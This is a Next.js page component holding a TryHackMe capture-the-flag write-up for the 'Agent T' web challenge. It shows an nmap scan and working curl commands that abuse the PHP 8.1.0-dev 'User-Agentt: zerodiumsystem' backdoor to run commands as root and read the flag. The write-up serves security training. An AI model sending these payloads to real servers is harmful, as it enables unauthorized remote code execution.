'use client'

import { useState } from 'react'
import { Shield } from 'lucide-react'
import { WriteupShell, Step, Terminal, ZoomImage, ImageModal, MindsetQuote } from '@/components/WriteupShell'

export default function AgentTWriteup() {
  const [openImage, setOpenImage] = useState<{ src: string; alt: string } | null>(null)

  return (
    <>
      <WriteupShell
        title="Agent T"
        category="Web Exploitation"
        categoryHref="/ctf/web"
        difficulty="Easy"
        source="TryHackMe"
        icon={<Shield className="h-6 w-6 text-primary-500" />}
      >
        <h2>Challenge Overview</h2>
        <div className="not-prose grid gap-3 mb-6">
          <div>
            <div className="text-gray-400 text-sm">Description</div>
            <p className="mt-1 text-gray-200">
              Agent T uncovered this website, which looks innocent enough, but something seems off about how the server responds.
              Deploy the vulnerable machine and wait a couple of minutes for it to respond.
            </p>
          </div>
        </div>

        <ZoomImage
          src="/assets/adminT.png"
          alt="Agent T target web interface"
          caption="Initial target surface from Agent T scenario"
          onOpen={setOpenImage}
        />
        <ZoomImage
          src="/assets/adminDashboard.png"
          alt="Agent T admin dashboard view"
          caption="Dashboard view shown after initial target page"
          onOpen={setOpenImage}
        />

        <hr className="border-white/10 my-6" />

        <h2>Phase 1 - Reconnaissance</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          The first thing you always do is scan the target with Nmap:
        </p>
        <Terminal lines={['$ nmap --privileged -sV -sC -p- -oN nmapInfo.txt 10.48.131.77']} />

        <h3 className="mt-6">Flag Breakdown</h3>
        <ul className="text-gray-300 text-sm space-y-1 list-disc list-inside">
          <li><code className="bg-white/5 px-1 rounded text-xs">-sV</code> - version detection (the most important flag here)</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-sC</code> - default scripts</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-p-</code> - all 65535 ports</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-oN</code> - save output to a file</li>
        </ul>
        <Terminal lines={[
          'PORT   STATE SERVICE VERSION',
          '80/tcp open  http    PHP cli server 5.5 or later (PHP 8.1.0-dev)',
        ]} />
        <p className="text-gray-300 text-sm leading-relaxed">
          Only one port open: HTTP on port 80, running <strong>PHP 8.1.0-dev</strong>.
          The <code className="bg-white/5 px-1 py-0.5 rounded text-xs">-dev</code> tag is the immediate red flag - production servers should never run development builds.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 2 - Identifying the Vulnerability</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          <strong>PHP 8.1.0-dev</strong> points directly to a real-world supply chain attack from March 2021.
          Attackers pushed malicious commits to PHP&apos;s official Git repository, introducing a backdoor
          triggered by a custom HTTP header named <code className="bg-white/5 px-1 py-0.5 rounded text-xs">User-Agentt</code> (double <code className="bg-white/5 px-1 py-0.5 rounded text-xs">t</code>).
          If the header started with <code className="bg-white/5 px-1 py-0.5 rounded text-xs">zerodiumsystem(</code>, the server executed the payload as a system command.
        </p>
        <p className="text-gray-300 text-sm leading-relaxed mt-2">
          Tracked as <strong>EDB-ID: 49933</strong> in Exploit-DB.
          Vulnerability class: <strong>Unauthenticated Remote Code Execution (RCE)</strong>.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 3 - Exploitation</h2>
        <p className="text-gray-300 text-sm leading-relaxed">
          The attack surface is a single malicious HTTP header:
        </p>
        <Terminal lines={[`$ curl -s http://10.48.131.77/ -H "User-Agentt: zerodiumsystem('id');" | grep uid`]} />

        <h3 className="mt-6">What&apos;s Happening Here</h3>
        <ul className="text-gray-300 text-sm space-y-1 list-disc list-inside">
          <li><code className="bg-white/5 px-1 rounded text-xs">curl -s</code> - silent mode, suppresses progress output</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">-H</code> - sets a custom HTTP header</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">User-Agentt</code> - the backdoored header (double <code className="bg-white/5 px-1 rounded text-xs">t</code>)</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">zerodiumsystem(&apos;id&apos;)</code> - triggers the backdoor and runs <code className="bg-white/5 px-1 rounded text-xs">id</code> on the server</li>
          <li><code className="bg-white/5 px-1 rounded text-xs">| grep uid</code> - filters useful output from HTML noise</li>
        </ul>
        <Terminal lines={['uid=0(root) gid=0(root) groups=0(root)']} />
        <p className="text-gray-300 text-sm leading-relaxed">
          The shell command is executed as <strong>root</strong> - full system compromise.
        </p>

        <hr className="border-white/10 my-6" />

        <h2>Phase 4 - Finding and Reading the Flag</h2>
        <Terminal lines={[
          '# Find the flag file',
          `curl -s http://10.48.131.77/ -H "User-Agentt: zerodiumsystem('find / -name flag.txt 2>/dev/null');"`,
          '',
          '# Read the flag',
          `curl -s http://10.48.131.77/ -H "User-Agentt: zerodiumsystem('cat /flag.txt');"`,
        ]} />
        <ZoomImage
          src="/assets/flag_location.png"
          alt="Finding flag location on compromised target"
          caption="Locating flag file path with remote command execution"
          onOpen={setOpenImage}
        />
        <ZoomImage
          src="/assets/flag.png"
          alt="Flag output after reading /flag.txt"
          caption="Final flag extraction from the target"
          onOpen={setOpenImage}
        />

        <MindsetQuote
          label="WEB SECURITY"
          quote="Enumeration reveals attack paths, but version awareness reveals zero-day history. Never trust a dev build in production, and never assume one header cannot break everything."
        />
      </WriteupShell>

      <ImageModal img={openImage} onClose={() => setOpenImage(null)} />
    </>
  )
}